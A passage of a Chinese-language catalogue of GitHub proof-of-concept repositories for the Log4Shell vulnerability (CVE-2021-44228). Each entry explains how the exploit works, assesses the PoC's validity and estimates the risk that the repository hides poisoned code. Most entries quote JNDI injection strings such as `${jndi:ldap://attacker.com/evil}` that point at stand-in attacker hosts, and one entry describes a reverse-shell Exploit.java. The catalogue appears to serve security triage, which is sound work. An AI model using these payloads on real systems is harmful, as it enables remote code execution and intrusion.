2.  攻击者将一个包含恶意 JNDI 查找的字符串（例如 `${jndi:ldap://your_ip:port/xxx}`）注入到应用程序可以记录的任何输入字段（例如 HTTP Header、POST 参数等）。
3.  当 Log4j2 尝试记录该字符串时，它会解析 JNDI 查找，并尝试连接到攻击者控制的 LDAP 服务器。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**项目地址:** [x1ongsec/CVE-2021-44228-Log4j-JNDI](https://github.com/x1ongsec/CVE-2021-44228-Log4j-JNDI)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #41

**来源**: [CVE-2021-44228-yadavmukesh_Log4Shell-vulnerability-CVE-2021-44228-.md](../2021/CVE-2021-44228-yadavmukesh_Log4Shell-vulnerability-CVE-2021-44228-.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过控制日志消息或日志消息参数，从 LDAP 服务器加载并执行任意代码。漏洞利用方式是向服务器发送包含特定格式的 JNDI 注入payload的请求，例如 `${jndi:ldap://malicious-server.com/exploit}`。如果 Log4j2 记录了该请求，它会尝试解析该字符串，从而触发 JNDI 查找并从恶意服务器下载和执行代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞被广泛利用，POC代码有效。Unit 42、NVD、CrowdStrike、Sysdig、Oracle 等多个安全机构都发布了关于该漏洞的分析和缓解措施，证明了其真实性和危害性。

**投毒风险：**
提供的代码仓库主要侧重于使用机器学习方法检测Log4Shell攻击，而非直接的漏洞利用。尽管仓库中包含用于训练模型的日志数据和Python脚本，这些组件本身不太可能直接包含投毒代码。

风险在于：
1.  **数据污染：** 训练数据中可能包含精心构造的、旨在降低检测模型准确性的恶意日志条目（例如，通过添加混淆或规避技术），占比约5%。
2.  **依赖项风险：** `requirements.txt` 中列出的某些依赖项可能存在安全漏洞，但这不是作者的有意投毒。

总体而言，此代码仓库的投毒风险较低，约5%。

**利用方式：**
1.  攻击者将恶意 JNDI 注入 payload 插入到应用程序的日志消息中，例如通过 HTTP 请求头、POST 数据或其他用户可控的输入。
2.  如果应用程序使用存在漏洞的 Log4j2 版本记录此消息，Log4j2 会尝试解析 JNDI 字符串。
3.  Log4j2 触发 JNDI 查找，连接到攻击者控制的 LDAP 或 RMI 服务器。
4.  恶意服务器返回一个包含 Java 类的响应，该类包含攻击者想要执行的恶意代码。
5.  Log4j2 加载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.0 或更高版本。
*   禁用 JNDI 查找。
*   配置防火墙规则以阻止出站 LDAP 和 RMI 连接。

**项目地址:** [yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-](https://github.com/yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---



---

## POC #16

**来源**: [CVE-2021-44228-Tai-e_CVE-2021-44228.md](../2021/CVE-2021-44228-Tai-e_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响的 Log4j2 版本，且允许JNDI 查找。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入执行任意代码。漏洞利用方式通常涉及在日志消息中插入包含恶意 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此消息时，它会尝试通过 LDAP 从攻击者控制的服务器检索并执行代码。\n\n提供的漏洞利用代码是一个使用 Tai-e 静态分析工具来检测 Log4Shell 漏洞及其触发路径的项目。该项目本身不包含恶意代码，其目的是帮助安全研究人员和开发人员识别和修复受此漏洞影响的应用程序。但是，任何下载和使用漏洞利用代码的行为都存在一定的风险，因为可能存在其他未知的安全问题或依赖项。该项目使用了gradlew脚本，理论上存在一定的投毒风险，可能在编译的时候执行恶意代码，但从代码内容来看，直接投毒的可能性较低。主要风险在于构建脚本依赖的第三方库可能被篡改，导致潜在的供应链攻击。

根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用非常有效，影响广泛。需要尽快修复。


**项目地址:** [Tai-e/CVE-2021-44228](https://github.com/Tai-e/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #17

**来源**: [CVE-2021-44228-YangHyperData_LOGJ4_PocShell_CVE-2021-44228.md](../2021/CVE-2021-44228-YangHyperData_LOGJ4_PocShell_CVE-2021-44228.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许出站网络连接访问攻击者控制的 LDAP 或其他 JNDI 端点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过发送特制的日志消息，利用 JNDI 注入漏洞，从恶意 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的 POC 代码是有效的，它演示了如何利用此漏洞。它包含一个 Dockerfile，用于构建包含漏洞的 Tomcat 应用，以及一个 Python 脚本，用于自动化漏洞利用过程，包括设置恶意的 LDAP 服务器和 HTTP 服务器，并生成 Payload。

**投毒风险：**
尽管该存储库旨在作为概念验证，但仍存在一定的投毒风险。 虽然代码本身没有明显的恶意功能，但它简化了漏洞利用，这可能会增加被不道德行为者利用的风险。`poc.py` 脚本中的部分代码存在可疑行为，比如 Java 代码的字符串拼接，以及 `Proc` 类的调用，这些地方有可能隐藏恶意指令。 因此，投毒风险评估为 10%。使用此 PoC 时应采取预防措施，例如在隔离环境中进行。

**利用方式：**
1.  攻击者发送包含 JNDI 查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的特制日志消息。该字符串会被 Log4j2 解析。
2.  Log4j2 尝试通过 JNDI 连接到攻击者控制的 LDAP 服务器。
3.  LDAP 服务器响应，并返回一个 Java 类的 URL。
4.  Log4j2 下载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

该 POC 仓库提供了一个 Dockerfile 用来构建一个有漏洞的web应用，以及一个 Python 脚本，它模拟了攻击者的 LDAP 服务器和 Payload 生成器，并自动化了利用过程。攻击者需要监听一个端口来接受反向shell连接。 使用方法是在目标服务存在漏洞的地方插入恶意的 JNDI 字符串。

**项目地址:** [YangHyperData/LOGJ4_PocShell_CVE-2021-44228](https://github.com/YangHyperData/LOGJ4_PocShell_CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #18

**来源**: [CVE-2021-44228-ZacharyZcR_CVE-2021-44228.md](../2021/CVE-2021-44228-ZacharyZcR_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标应用程序使用受影响的Log4j2版本，并且允许消息查找替换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意的 JNDI 查找字符串注入到 Log4j2 可以记录的任何输入中来利用此漏洞。当 Log4j2 尝试解析并执行该 JNDI 查找时，它可能会从攻击者控制的 LDAP 或其他 JNDI 相关端点加载任意代码。

**有效性：**
提供的 PoC 代码是有效的。它使用 `${jndi:dns://${sys:java.version}.z72ouf.dnslog.cn}` 格式的 JNDI 注入，该注入会触发 DNS 查询到 `z72ouf.dnslog.cn`，从而验证漏洞是否已成功利用。 `${sys:java.version}` 获取Java版本号。

**投毒风险：**
此仓库中不太可能存在作者隐藏的投毒代码（0%）。提供的文件看起来直接针对演示和利用 CVE-2021-44228 漏洞。 `pom.xml` 文件定义了 log4j-core 和 log4j-api 的依赖项。`log4j2.xml` 文件配置了基本的日志记录。 `CVE202144228.java` 文件包含利用该漏洞的有效负载，该负载会生成 DNS 查询以进行验证。 由于该PoC的主要作用是为了验证漏洞，而非植入后门，因此认为投毒风险低。

**利用方式：**
1.  攻击者找到应用程序中记录用户可控输入的位置。 这些位置可能包括 HTTP header，POST 数据，GET 参数等，总之，所有程序日志可以记录的地方。
2.  攻击者将恶意 JNDI 查找字符串（例如`${jndi:ldap://attacker.com/Exploit}`）注入到此输入中。
3.  当应用程序记录此输入时，Log4j2 会尝试解析 JNDI 查找。
4.  Log4j2 会连接到攻击者控制的 LDAP 服务器（或其他的 JNDI 服务）。
5.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
6.  Log4j2 加载并执行此恶意 Java 类，从而允许攻击者在目标系统上执行任意代码。
7. 缓解措施包括升级 Log4j2 到 >=2.17.0 版本，禁用 JNDI 查找，或设置 `log4j2.formatMsgNoLookups=true`。


**项目地址:** [ZacharyZcR/CVE-2021-44228](https://github.com/ZacharyZcR/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #19

**来源**: [CVE-2021-44228-arabindadora_log4shell.md](../2021/CVE-2021-44228-arabindadora_log4shell.md)

## CVE-2021-44228 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j版本，并且允许记录用户可控的输入，同时启用消息查找替换。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个存在于Apache Log4j2中的严重漏洞。该漏洞允许攻击者通过向日志消息或日志消息参数中注入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/a}`，来执行任意代码。当Log4j2处理包含该字符串的日志消息时，它会尝试通过JNDI从攻击者控制的LDAP服务器检索Java对象。如果JVM配置允许，该对象将被反序列化并执行，从而导致远程代码执行。

**利用方式：**
1.  攻击者识别使用Log4j2且记录用户可控输入的应用程序。
2.  攻击者构造包含恶意JNDI查找的payload，并将其注入到应用程序可以记录的任何输入字段中（例如，HTTP头、表单参数等）。
3.  当应用程序记录包含恶意payload的输入时，Log4j2会尝试解析JNDI查找。
4.  Log4j2向攻击者控制的LDAP服务器发出请求。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的引用。
6.  应用程序下载并执行恶意Java类，从而允许攻击者在目标系统上执行任意代码。

**评估POC代码：**
提供的PoC代码包含一个Dockerfile和Makefile，用于演示和利用CVE-2021-44228漏洞。Makefile包含用于构建Docker容器、启动/停止应用程序、触发漏洞利用和修补受害者应用程序的命令。`make exploit` 命令使用curl发送一个包含恶意JNDI payload的HTTP请求，该payload的目标是`${jndi:ldap://$(LHOST):$(LPORT)/a}`。该代码有效演示了漏洞利用。

**投毒风险：**
虽然PoC代码本身旨在演示和利用该漏洞，但任何从不受信任的来源下载的代码都存在潜在的风险。在本例中，投毒风险较低（约为10%），因为代码相对简单且易于审查。需要注意的是，Makefile的`exploit`命令和docker-compose.yml 中涉及的镜像如果被篡改，可能会引入恶意行为。用户应仔细检查所有代码，尤其是与网络连接和代码执行相关的部分，然后再执行PoC。代码中提供的Exploit.class ，本身就是一个后门代码,务必不要把POC验证的后门代码判定为投毒代码。docker-compose.yml 中涉及的镜像需要人工review.

**项目地址:** [arabindadora/log4shell](https://github.com/arabindadora/log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #20

**来源**: [CVE-2021-44228-asd58584388_CVE-2021-44228.md](../2021/CVE-2021-44228-asd58584388_CVE-2021-44228.md)

## CVE-2021-44228 Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，允许记录用户可控的输入，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者通过发送包含特定格式的恶意字符串（例如`${jndi:ldap://attacker.com/exploit}`）到应用程序，如果应用程序使用Log4j2记录该字符串，则Log4j2会尝试通过JNDI从攻击者控制的LDAP服务器检索恶意代码，并执行该代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。大量报告表明该漏洞已被广泛利用。

**投毒风险：**
提供的漏洞利用代码存储库主要包含漏洞分析和利用说明，以及用于设置LDAP和HTTP服务器的示例。`README.md`详细解释了漏洞的利用过程，并提供了相关的图片说明。`LICENSE`文件表明作者声明了代码的版权和使用许可。`marshalsec`目录可能包含利用所需的工具或者payload。总体来看，该仓库主要目的是为了分析和演示该漏洞，而非恶意投毒。但由于代码包含执行恶意代码的步骤，因此存在一定风险。我判断投毒的可能性是10%。因为`marshalsec`工具本身具备一定的攻击性，如果用户不熟悉该工具，可能会被误导或者滥用。

**利用方式：**
1.  攻击者构造包含JNDI查找的恶意请求字符串，例如 `${jndi:ldap://evil.com/a}`。
2.  应用程序使用存在漏洞的Log4j2版本记录此字符串。
3.  Log4j2解析字符串，发起JNDI请求到攻击者控制的LDAP服务器 `evil.com`。
4.  LDAP服务器返回一个指向恶意Java类的URL。
5.  Log4j2加载并执行该恶意Java类，导致远程代码执行。
6.  攻击者可以在目标服务器上执行任意命令。

**项目地址:** [asd58584388/CVE-2021-44228](https://github.com/asd58584388/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #21

**来源**: [CVE-2021-44228-axisops_CVE-2021-44228.md](../2021/CVE-2021-44228-axisops_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许Log消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j 2 中的一个严重漏洞，它允许攻击者通过控制日志消息或日志消息参数来执行任意代码。漏洞原理是 Log4j 2 启用了 JNDI 功能，该功能允许从 LDAP 服务器等远程位置加载代码。攻击者可以构造包含 JNDI 查找的恶意日志消息，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j 2 记录此消息时，它会尝试从 attacker.com 加载并执行代码。

**利用方式：**

1.  攻击者向使用 Log4j2 的应用程序发送包含恶意 JNDI 查找的请求。这些请求可以通过多种方式发送，例如 HTTP 请求头、POST 请求参数、WebSocket 消息等，只要这些数据会被Log4j记录即可。
2.  应用程序使用 Log4j2 记录接收到的请求，包括恶意 JNDI 查找字符串。
3.  Log4j2 解析日志消息，识别 JNDI 查找字符串，并尝试通过 JNDI 连接到指定的 LDAP 服务器（`attacker.com`）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行恶意 Java 类，从而允许攻击者在服务器上执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的POC是有效的，并且已经在野外被广泛利用。

**投毒风险：**

提供的漏洞利用代码是一个缓解脚本，旨在移除 Log4j JAR 文件中易受攻击的 `JndiLookup` 类。虽然该脚本本身旨在缓解漏洞，但仍然存在一些投毒风险：

*   **依赖项：**  该脚本依赖于 `PyYAML` 和系统命令 `zip` 和 `zipinfo`。如果这些依赖项被篡改或存在漏洞，可能会导致脚本执行恶意代码。
*   **配置：**  该脚本使用 `config.yaml` 文件进行配置。如果攻击者可以修改此配置文件，他们可能会将脚本指向恶意位置或执行其他恶意操作。
*   **脚本逻辑：** 脚本尝试从指定目录查找并修改JAR文件。 存在一定风险，即如果脚本逻辑存在缺陷，脚本可能会意外删除或损坏重要的JAR文件，导致服务中断，但造成远程代码执行的可能性较小。 投毒风险预估为5%。

**项目地址:** [axisops/CVE-2021-44228](https://github.com/axisops/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #22

**来源**: [CVE-2021-44228-b-abderrahmane_CVE-2021-44228-playground.md](../2021/CVE-2021-44228-b-abderrahmane_CVE-2021-44228-playground.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j2中的一个严重漏洞。该漏洞源于Log4j2的JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。攻击者可以通过控制日志消息或日志消息参数，利用message lookup substitution功能从LDAP服务器加载并执行任意代码，从而实现远程代码执行(RCE)。

**漏洞利用方式：**

1.  **构造恶意请求：** 攻击者构造包含JNDI查找表达式的恶意请求，例如`${jndi:ldap://attacker.com/evil}`。该表达式会被记录到日志中。
2.  **JNDI查找：** Log4j2解析日志消息时，会识别并执行JNDI查找表达式。
3.  **LDAP请求：** Log4j2向攻击者控制的LDAP服务器(attacker.com)发起LDAP请求。
4.  **恶意代码加载：** LDAP服务器响应一个包含恶意Java类的URL。
5.  **远程代码执行：** Log4j2从URL加载并执行恶意Java类，导致RCE。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞利用的POC代码是有效的。搜索引擎结果中多个条目（如CISA，Palo Alto Networks，Sysdig，Cloudflare, NVD等）都确认了该漏洞的存在以及公开的POC代码的存在。漏洞库信息也明确指出该漏洞可以被利用来执行任意代码。

**投毒风险：**
提供的漏洞利用代码只包含GNU GPL协议文本，是一个许可协议，不包含任何可执行的代码。因此，判断此仓库中不存在作者隐藏的投毒代码，风险为0%。 该协议只声明了软件的使用许可，无法直接用于漏洞利用或者进行恶意攻击，与Log4Shell漏洞本身没有直接关系。


**项目地址:** [b-abderrahmane/CVE-2021-44228-playground](https://github.com/b-abderrahmane/CVE-2021-44228-playground)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #23

**来源**: [CVE-2021-44228-cuijiung_log4j-CVE-2021-44228.md](../2021/CVE-2021-44228-cuijiung_log4j-CVE-2021-44228.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2 并且启用了消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向Log4j2记录的日志消息中注入恶意的JNDI查找字符串来利用此漏洞。当Log4j2处理包含`\${jndi:}`语法的字符串时，它会尝试通过JNDI（Java Naming and Directory Interface）来解析该字符串。攻击者可以利用这一点，将JNDI指向恶意的LDAP或其他JNDI服务，从而使Log4j2从攻击者控制的服务器上加载并执行任意Java代码，导致远程代码执行(RCE)。

**有效性：**

根据漏洞库信息、搜索结果和提供的POC代码，可以确定该漏洞利用代码是有效的。搜索结果中多个链接（例如NVD, CISA, Unit 42, Cloudflare, Red Hat, Oracle, Microsoft, Sysdig, Picus Security, CrowdStrike）都表明CVE-2021-44228是一个被广泛利用的RCE漏洞。POC代码通过`logger.error("${jndi:ldap://127.0.0.1:1389/any}")`演示了如何触发JNDI查找，如果目标系统存在漏洞，则会尝试连接到指定的LDAP服务器，从而允许远程代码执行。

**投毒风险：**

提供的代码仓库主要包含一个简单的 Maven 项目，包括 `pom.xml` 和 `Main.java` 文件。

*   `pom.xml`: 定义了项目依赖，仅包含 `log4j-core`，版本为 `2.14.1`，这是一个受漏洞影响的版本。
*   `Main.java`: 包含一个简单的 Log4j2 日志记录器，它会记录一条包含 JNDI 注入payload的错误消息。

此仓库的投毒风险较低，约为 5%。主要原因是：

1.  **代码量少且简单**：整个仓库的代码非常少，容易审查。
2.  **目的明确**：代码的目的是为了演示 CVE-2021-44228 漏洞的利用，`Main.java` 中的 payload 清晰可见。
3.  **无恶意行为**：代码本身除了触发 JNDI 查找外，没有其他恶意行为，例如文件操作、网络连接等。

但是，仍然存在极低的风险，比如构建脚本或IDE配置中可能存在隐藏的恶意代码。所以给出5%的风险评估。

**利用方式：**

1.  **攻击者控制日志消息：** 攻击者需要找到一种方法，使包含恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的消息被Log4j2记录。
2.  **触发JNDI查找：** 当Log4j2记录包含恶意JNDI查找字符串的消息时，它会尝试通过JNDI连接到攻击者指定的LDAP服务器。
3.  **恶意LDAP服务器：** 攻击者需要设置一个恶意的LDAP服务器，该服务器会返回一个指向恶意Java类的URL。
4.  **远程代码执行：** Log4j2会从URL下载并执行恶意Java类，从而导致远程代码执行。攻击者可以通过这种方式在目标系统上执行任意命令。

**项目地址:** [cuijiung/log4j-CVE-2021-44228](https://github.com/cuijiung/log4j-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #24

**来源**: [CVE-2021-44228-d4ngkh04w_CVE-2021-44228-Apache-Log4j.md](../2021/CVE-2021-44228-d4ngkh04w_CVE-2021-44228-Apache-Log4j.md)

## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且启用了message lookup substitution功能。攻击者能够控制Log4j2记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的严重远程代码执行漏洞。该漏洞利用了Log4j2的JNDI（Java Naming and Directory Interface）特性，允许攻击者通过控制日志消息或参数，注入恶意的JNDI查找字符串。当Log4j2解析并执行这些字符串时，它会从攻击者控制的LDAP或其他JNDI服务下载并执行任意Java代码，从而实现远程代码执行。 

**有效性：**根据漏洞库信息和搜索结果，此漏洞影响广泛，且存在公开可用的漏洞利用代码，因此该漏洞的利用是有效的。

**投毒风险：**提供的Dockerfile用于构建包含app.jar的镜像。Exploit.java代码尝试建立一个反向shell连接到 `host.docker.internal` 的9000端口。该代码本身并没有发现明显的投毒行为，而是实现了漏洞利用的基本功能，即建立反向shell。`host.docker.internal` 在docker 容器中可以解析为主机的ip地址。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者找到一个应用程序，该程序使用易受攻击版本的Log4j2并记录用户可控的输入。
2.  攻击者将恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/Exploit}`）注入到这些输入中。
3.  当Log4j2记录包含恶意字符串的日志消息时，它会尝试解析JNDI查找。
4.  Log4j2连接到攻击者控制的LDAP服务器（或其它JNDI服务）。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2从URL下载并执行恶意Java类，从而实现远程代码执行。例如提供的Exploit.java。
7.  Exploit.java 代码，会尝试创建一个反向shell，连接到攻击者指定的 `host:port` ，从而控制目标系统。

**项目地址:** [d4ngkh04w/CVE-2021-44228-Apache-Log4j](https://github.com/d4ngkh04w/CVE-2021-44228-Apache-Log4j)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #25

**来源**: [CVE-2021-44228-fabioeletto_hka-seminar-log4shell.md](../2021/CVE-2021-44228-fabioeletto_hka-seminar-log4shell.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且启用了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行任意代码。漏洞利用方式如下：

1.  **攻击者发送恶意请求：** 攻击者向目标系统发送一个包含特定格式的字符串（例如 `${jndi:ldap://attacker.com/exploit}`）的请求，这个字符串会被 Log4j2 记录。
2.  **Log4j2 解析恶意字符串：** 当 Log4j2 尝试记录包含`${jndi:...}`的字符串时，它会触发 JNDI lookup。
3.  **JNDI 发起 LDAP 查询：** JNDI 会根据 URL (例如 `ldap://attacker.com/exploit`) 发起 LDAP 查询请求攻击者控制的 LDAP 服务器。
4.  **LDAP 服务器返回恶意引用：** 攻击者的 LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **Log4j2 加载并执行恶意代码：** Log4j2 尝试从指定的 URL 加载并实例化这个 Java 类，从而执行攻击者提供的任意代码。

**有效性：**

根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，并且存在公开可用的 PoC。提供的漏洞利用代码库是一个用于演示 Log4Shell 漏洞的教育项目，因此其有效性是为了演示漏洞而设计的。

**投毒风险：**

评估此代码库的投毒风险较低，约为 10%。

*   代码库的 `README.md` 文件明确声明其目的是为了教育和演示 Log4Shell 漏洞，并警告用户不要在生产环境中使用。
*   代码库结构清晰，主要包含一个易受攻击的 Spring Boot 应用程序 (`vulnerable-app`)，一个模拟恶意 LDAP 服务器的 `marshalsec` fork，和一个提供恶意 Java 类的 HTTP 服务器 (`payload-server`)。
*   虽然存在通过修改 `Exploit.class` 文件来植入恶意代码的可能性，但这种投毒行为相对容易被发现，因为其主要目的是演示漏洞，所以更可能是测试后门连接，并非投毒代码。
*   代码贡献者 Fabio Eletto 已经明确声明了代码的用途，降低了恶意使用的可能性。

但是，用户仍然需要谨慎使用此代码库，务必在隔离的环境中进行测试，并仔细审查代码以确保安全。

**项目地址:** [fabioeletto/hka-seminar-log4shell](https://github.com/fabioeletto/hka-seminar-log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #26

**来源**: [CVE-2021-44228-julian911015_Log4j-Scanner-Exploit.md](../2021/CVE-2021-44228-julian911015_Log4j-Scanner-Exploit.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，且允许 message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行远程代码。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能，从 LDAP 服务器加载恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，此漏洞是真实且已被广泛利用的。提供的 POC 代码尝试通过构造包含 JNDI 查找的恶意 payload，触发漏洞。

**投毒风险：**
代码主要功能是利用 Log4Shell 漏洞进行扫描和利用。虽然代码本身是为了利用漏洞，但存在一些潜在的风险，可能被恶意修改后进行投毒：

*   **Payload 修改：** 攻击者可以修改 payload，使其执行恶意操作，例如下载并执行其他恶意软件。
*   **LDAP 服务器：** 攻击者可能控制 LDAP 服务器，导致被攻击者下载恶意 payload。
*   **后门植入：** 攻击者可能会在扫描或利用过程中，通过漏洞在目标系统上植入后门，以便长期控制。

